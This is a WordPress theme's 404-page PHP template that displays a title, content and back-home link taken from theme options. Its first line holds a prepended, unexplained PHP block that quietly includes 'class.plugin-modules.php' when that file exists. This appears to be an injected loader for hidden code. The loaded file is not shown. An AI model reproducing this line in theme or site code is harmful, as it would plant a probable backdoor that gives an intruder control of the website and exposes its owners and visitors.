<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
/**
 * The template for displaying 404 pages (Not Found)
 */
global $theme_option; 
get_header(); ?>

<section class="section boxed-width grey-background padding-bottom padding-top" id="blogscroll">
	<div class="container">
		<div class="twelve columns padding-top">
			<div class="text-center" style="text-align: center;">
				<h1><?php echo htmlspecialchars_decode($theme_option['404_title']); ?></h1>
				<div class="content_404">
				<?php echo htmlspecialchars_decode($theme_option['404_content']); ?>
				</div>
				<div class="blog-link dark"><a href="<?php echo esc_url(home_url()); ?>"><i class="icon-long-arrow-left"></i> <?php echo htmlspecialchars_decode( $theme_option['back_404'] ); ?></a></div>
			</div>
       </div> 	
    </div><!-- end container -->
</section><!-- end postwrapper -->

<?php
get_footer();
